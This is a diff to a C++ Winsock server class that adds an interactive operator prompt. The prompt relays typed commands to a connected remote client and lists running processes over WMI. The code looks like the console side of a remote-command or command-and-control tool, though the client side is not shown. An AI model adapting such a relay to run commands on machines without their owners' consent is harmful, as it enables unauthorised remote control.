@@ -4,8 +4,10 @@
 #include "WinsockServer_RemoteClient.h"
 
 // Additional
-#include <iostream>
-#include <conio.h> 
+#include "WMIObject.h"
+#include "WMIRoutine.h"
+
+extern WMIRoutine* routine;
 
 WinsockServer_RemoteClient::WinsockServer_RemoteClient(SOCKET socket) :
 	m_Socket(socket)
@@ -22,14 +24,10 @@ WinsockServer_RemoteClient::~WinsockServer_RemoteClient()
 
 DWORD WinsockServer_RemoteClient::Recv()
 {
+	EnableCommand();
+
 	char buffer[DEFAULT_BUFLEN];
 	int32_t bufferLenght = DEFAULT_BUFLEN;
-
-	std::string comma;
-	std::getline(std::cin, comma);
-
-	std::string command = 'S' + comma;
-	Send(command.c_str(), command.length() + 1);
 
 	int res;
 	do {
@@ -73,6 +71,7 @@ void WinsockServer_RemoteClient::ProcessCommand(BSTR command)
 	case L'X':
 	{
 		Log::Green(L"%s", &command[1]);
+		EnableCommand();
 	}
 	break;
 
@@ -83,24 +82,53 @@ void WinsockServer_RemoteClient::ProcessCommand(BSTR command)
 	}
 	break;
 
-	// Message
-	case L'M':
-	{
-		Log::Print(L"%s", &command[1]);
-	}
-	break;
-
 	// Error
 	case L'E':
 	{
 		Log::Warn(L"Client error: [%s].", &command[1]);
+		EnableCommand();
 	}
 	break;
 
 	default:
 	{
-		Log::Warn(L"Client: Unknown token [%c].", command[0]);
+		Log::Print(L"%s", command);
 	}
 	break;
+	}
+}
+
+void WinsockServer_RemoteClient::EnableCommand()
+{
+	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 15);
+
+	printf("Enter the command: ");
+
+	std::string command;
+	std::getline(std::cin, command);
+
+	// Check exit
+	if (command == "/exit")
+	{
+		Send("E", 2);
+	}
+	else if (command == "/procs")
+	{
+		Log::Green(L"Processes");
+		std::vector<WMIObject*> processes = routine->GetWMIQueryObject(L"SELECT * FROM Win32_Process");
+		for (auto it = processes.begin(); it != processes.end(); it++)
+		{
+			Log::Print(L"-- %s -- %d -- %d",
+				(*it)->Get(L"Name"),
+				(*it)->GetUINT(L"ProcessId"),
+				(*it)->GetUINT(L"WorkingSetSize")
+			);
+		}
+		EnableCommand();
+	}
+	else
+	{
+		command = 'S' + command;
+		Send(command.c_str(), command.length() + 1);
 	}
 }
